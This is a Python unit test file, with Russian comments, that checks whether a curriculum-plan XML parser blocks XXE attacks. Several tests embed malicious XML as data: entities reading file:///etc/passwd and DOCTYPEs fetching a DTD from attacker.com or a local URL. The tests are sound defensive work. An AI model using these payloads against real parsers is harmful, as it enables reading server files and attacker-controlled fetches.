"""
Тесты безопасности и защиты от XXE атак для curriculum_parser.
"""
import unittest

try:
    from modules.curriculum_parser import (
        PLXParser,
        parse_curriculum_plan,
        SecurityValidationError,
        PLXParsingError,
        validate_xml_security,
    )
except ImportError:
    from curriculum_parser import (  # type: ignore
        PLXParser,
        parse_curriculum_plan,
        SecurityValidationError,
        PLXParsingError,
        validate_xml_security,
    )


class TestSecurityValidation(unittest.TestCase):

    def test_direct_validate_xml_security_blocks_entity(self):
        malicious = """<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<Документ><Титул Код="09.03.03">&xxe;</Титул></Документ>"""
        with self.assertRaises(SecurityValidationError):
            validate_xml_security(malicious)

    def test_direct_validate_xml_security_blocks_doctype_system(self):
        malicious = """<?xml version="1.0"?>
<!DOCTYPE test SYSTEM "http://attacker.com/evil.dtd">
<Документ><Титул Код="09.03.03"/></Документ>"""
        with self.assertRaises(SecurityValidationError):
            validate_xml_security(malicious)

    def test_direct_validate_xml_security_blocks_doctype_public(self):
        malicious = """<?xml version="1.0"?>
<!DOCTYPE test PUBLIC "-//OASIS//DTD DocBook XML V4.1.2//EN" "http://attacker.com/evil.dtd">
<Документ><Титул Код="09.03.03"/></Документ>"""
        with self.assertRaises(SecurityValidationError):
            validate_xml_security(malicious)

    def test_direct_validate_xml_security_allows_safe_xml(self):
        safe_xml = """<?xml version="1.0" encoding="utf-8"?>
<Документ>
    <Титул Код="09.03.03" Имя="Прикладная информатика" />
</Документ>"""
        # Не должно вызывать исключений
        validate_xml_security(safe_xml)

    def test_parser_blocks_xxe_via_parse_plx_content(self):
        malicious = """<?xml version="1.0"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<Документ><Титул Код="09.03.03"/></Документ>"""
        with self.assertRaises(SecurityValidationError):
            PLXParser.parse_plx_content(malicious, "malicious.plx")

        # Проверка обратной совместимости с базовым PLXParsingError
        with self.assertRaises(PLXParsingError):
            PLXParser.parse_plx_content(malicious, "malicious.plx")

    def test_parse_curriculum_plan_blocks_xxe(self):
        malicious = """<?xml version="1.0"?>
<!DOCTYPE dsMMISDB SYSTEM "http://127.0.0.1:8000/xxe">
<dsMMISDB><Планы Код="1"/></dsMMISDB>"""
        with self.assertRaises(SecurityValidationError):
            parse_curriculum_plan(malicious, "attack.plx")


if __name__ == "__main__":
    unittest.main()
